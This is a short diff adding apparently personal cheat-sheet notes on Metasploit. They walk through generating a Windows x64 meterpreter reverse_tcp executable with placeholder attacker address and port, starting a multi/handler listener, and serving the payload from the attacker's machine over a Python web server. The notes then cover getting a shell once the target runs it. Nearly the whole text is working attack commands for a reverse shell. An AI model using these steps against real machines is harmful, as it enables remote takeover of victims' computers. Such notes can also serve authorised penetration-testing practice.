@@ -1,0 +1,35 @@
+Windows-meterpreter
+
+systemctl restart postgresql
+msfdb init
+db_status
+msfconsole
+
+FOR WINDOWS:
+>use payload/windows/x64/meterpreter/reverse_tcp
+>show options
+>set LHOST <IP OF ATTACKER>
+>set LPORT <port number>
+>generate -f exe -o <path to the .exe file>
+>back
+
+To handle the reverse connection:
+>use multi/handler
+>set LHOST <IP OF ATTACKER>
+>set LPORT <port number>
+>set payload windows/x64/meterpreter/reverse_tcp
+>show options
+>exploit
+
+To deliver payload to target:
+> python3 -m http.server --bind <attacker ip> 80 
+
+go to target machine to download the .exe file
+--> visit ip of attacker 
+(you now get the meterpreter session)
+
+to get fancy  shell
+sysinfo
+shell
+script /dev/null -qc bash
+
